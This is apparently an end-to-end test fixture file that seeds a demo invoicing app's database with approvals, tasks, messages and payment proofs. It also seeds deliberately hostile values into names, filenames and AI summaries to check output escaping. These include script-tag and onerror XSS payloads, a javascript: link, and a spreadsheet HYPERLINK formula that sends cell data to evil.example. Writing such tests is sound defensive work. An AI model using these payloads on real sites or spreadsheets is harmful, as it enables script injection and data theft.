// Staff e2e fixtures in Demo Agency (local stack, after `supabase db reset`). Real rows in the real tables, the
// same shapes the worker / processor / proof inbox write. Also the HOSTILE fixtures (issue G): customer names,
// invoice numbers, message bodies, AI summaries, task drafts and filenames that try to inject markup or formulas.
import { createClient } from "@supabase/supabase-js";
import { db } from "./db";
import { stack } from "./stack";
import { DEMO_TENANT as T } from "./users";

export const HOSTILE = {
  script: `<script>window.__pwned=1;alert("x")</script>`,
  img: `<img src=x onerror="window.__pwned=1">`,
  formula: `=HYPERLINK("http://evil.example/?"&A1,"click")`,
  arabic: "شركة الاختبار <b>غامق</b>",
  urdu: "ٹیسٹ کمپنی",
  link: "javascript:window.__pwned=1",
};

// 1x1 transparent PNG (magic bytes valid), used as a proof file.
export const PNG_1x1 = Buffer.from(
  "89504e470d0a1a0a0000000d4948445200000001000000010806000000" + "1f15c4890000000d49444154789c6360000002000154a24f5d0000000049454e44ae426082",
  "hex",
);

export interface StaffFixtures {
  invoice: (n: string) => string;
  approvals: Record<string, string>;
  tasks: Record<string, string>;
  unknown: Record<string, string>;
  proofs: Record<string, string>;
  promise: string;
  hostileCustomer: string;
  hostileInvoice: string;
}

async function invoiceIds(): Promise<Map<string, string>> {
  const r = await db().query<{ number: string; id: string }>("select number, id from public.invoices where tenant_id = $1", [T]);
  return new Map(r.rows.map((x) => [x.number, x.id]));
}

export async function seedStaffFixtures(): Promise<StaffFixtures> {
  const q = (sql: string, p: unknown[] = []) => db().query(sql, p);
  const ids = await invoiceIds();
  const inv = (n: string) => {
    const v = ids.get(n);
    if (!v) throw new Error(`fixture invoice missing: ${n}`);
    return v;
  };
  const customerOf = async (n: string) => (await q("select customer_id from public.invoices where id = $1", [inv(n)])).rows[0].customer_id as string;

  // Pending approvals: DA-0001/0002 for the screens, DA-0003/0004 for UI vs CLI parity.
  const approvals: Record<string, string> = {};
  for (const n of ["DA-0001", "DA-0002", "DA-0003", "DA-0004"]) {
    const r = await q(
      `insert into public.approvals (tenant_id, invoice_id, idempotency_key, step_id, channel, requested_at)
       values ($1, $2, $3, 's1', 'email', now()) on conflict (tenant_id, idempotency_key) do update set status = 'pending' returning id`,
      [T, inv(n), `${inv(n)}:s1:email`],
    );
    approvals[n] = r.rows[0].id;
  }

  // Tasks: a blocking claim with an AI draft (hostile), and two plain ones for parity.
  const tasks: Record<string, string> = {};
  const task = async (n: string, key: string, type: string, extra: { draft?: string; blocks?: boolean; details?: object } = {}) => {
    const r = await q(
      `insert into public.tasks (tenant_id, type, status, invoice_id, customer_id, dedupe_key, created_at, draft_reply, blocks_reminders_until, details)
       values ($1, $2, 'open', $3, $4, $5, now(), $6, $7, $8) on conflict (tenant_id, dedupe_key) do update set status = 'open', resolved_at = null returning id`,
      [T, type, inv(n), await customerOf(n), key, extra.draft ?? null, extra.blocks ? new Date(Date.now() + 3 * 864e5) : null, JSON.stringify(extra.details ?? {})],
    );
    tasks[key] = r.rows[0].id;
  };
  await task("DA-0005", "e2e-claim", "verify_payment_claim", { draft: `Thanks! ${HOSTILE.script} ${HOSTILE.formula}`, blocks: true, details: { summary: `AI says: ${HOSTILE.img}`, amount_text: HOSTILE.formula } });
  await task("DA-0006", "e2e-parity-ui", "human_review");
  await task("DA-0006", "e2e-parity-cli", "human_review");

  // Unknown-state messages (rule 17), one for the UI and one for the CLI.
  const unknown: Record<string, string> = {};
  for (const [n, key] of [["DA-0007", "ui"], ["DA-0008", "cli"]] as const) {
    const r = await q(
      `insert into public.messages (tenant_id, customer_id, channel, direction, idempotency_key, send_state, step_id, pending_since, purpose, attempt)
       values ($1, $2, 'email', 'out', $3, 'unknown', 's1', now() - interval '1 hour', 'reminder', 1)
       on conflict do nothing returning id`,
      [T, await customerOf(n), `${inv(n)}:s1:email`],
    );
    const id = r.rows[0]?.id ?? (await q("select id from public.messages where tenant_id = $1 and idempotency_key = $2", [T, `${inv(n)}:s1:email`])).rows[0].id;
    await q("insert into public.message_invoices (tenant_id, message_id, invoice_id) values ($1, $2, $3) on conflict do nothing", [T, id, inv(n)]);
    unknown[key] = id;
  }

  // Proofs (pending) with a real file in the private bucket; one hostile filename and hostile AI hints.
  const proofs: Record<string, string> = {};
  const s = stack();
  const admin = createClient(s.apiUrl, s.serviceRoleKey, { auth: { persistSession: false } });
  for (const [n, key, name] of [["DA-0009", "ui", `"><svg onload=alert(1)>.png`], ["DA-0010", "cli", "receipt.png"]] as const) {
    const id = (await q("select gen_random_uuid() as id")).rows[0].id as string;
    const path = `${T}/${id}`;
    const up = await admin.storage.from("payment-proofs").upload(path, PNG_1x1, { contentType: "image/png", upsert: true });
    if (up.error) throw new Error("proof upload failed");
    await q(
      `insert into public.payment_proofs (id, tenant_id, invoice_id, customer_id, storage_path, sha256, size_bytes, mime, original_name, created_at, hints)
       values ($1, $2, $3, $4, $5, encode(sha256($6::bytea), 'hex'), $7, 'image/png', $8, now(), $9)`,
      [id, T, inv(n), await customerOf(n), path, PNG_1x1, PNG_1x1.length, name, JSON.stringify({ amount: `${HOSTILE.formula}`, note: HOSTILE.script })],
    );
    proofs[key] = id;
  }

  // An active promise to cancel.
  const pr = await q(
    `insert into public.promises (tenant_id, invoice_id, customer_id, promised_on, status, reference_at, created_at)
     values ($1, $2, $3, current_date + 10, 'active', now(), now()) on conflict do nothing returning id`,
    [T, inv("DA-0011"), await customerOf("DA-0011")],
  );
  const promise = pr.rows[0]?.id ?? (await q("select id from public.promises where tenant_id = $1 and invoice_id = $2 and status = 'active'", [T, inv("DA-0011")])).rows[0].id;
  await q("update public.invoices set promised_on = current_date + 10 where id = $1", [inv("DA-0011")]).catch(() => undefined);

  // Hostile customer + invoice + inbound message with an AI summary and an attachment name.
  const hc = (
    await q(
      `insert into public.customers (tenant_id, display_name, email, language) values ($1, $2, 'hostile@example.test', 'ar')
       on conflict do nothing returning id`,
      [T, `${HOSTILE.img} ${HOSTILE.arabic} ${HOSTILE.formula}`],
    )
  ).rows[0]?.id as string;
  const hi = (
    await q(
      `insert into public.invoices (tenant_id, customer_id, number, amount_total, currency, issued_on, due_on, reference_code)
       values ($1, $2, $3, 4200, 'GBP', current_date - 40, current_date - 10, 'REFHOSTL') returning id`,
      [T, hc, `X-<script>1</script>`],
    )
  ).rows[0].id as string;
  const msg = (
    await q(
      `insert into public.messages (tenant_id, customer_id, channel, direction, purpose, body, subject, received_at, processed_at, analysis, attachments, matched_by)
       values ($1, $2, 'email', 'in', 'reply', $3, $4, now(), now(), $5, $6, 'thread') returning id`,
      [
        T,
        hc,
        `${HOSTILE.script}\n${HOSTILE.urdu}\n${HOSTILE.link}`,
        `Re: ${HOSTILE.img}`,
        JSON.stringify({ summary: `Customer wants ${HOSTILE.script}`, intent: "question" }),
        JSON.stringify([{ filename: `"><img src=x onerror=alert(1)>.pdf`, mime: "application/pdf", size: 1234 }]),
      ],
    )
  ).rows[0].id as string;
  await q("insert into public.message_invoices (tenant_id, message_id, invoice_id) values ($1, $2, $3)", [T, msg, hi]);

  return { invoice: inv, approvals, tasks, unknown, proofs, promise, hostileCustomer: hc, hostileInvoice: hi };
}
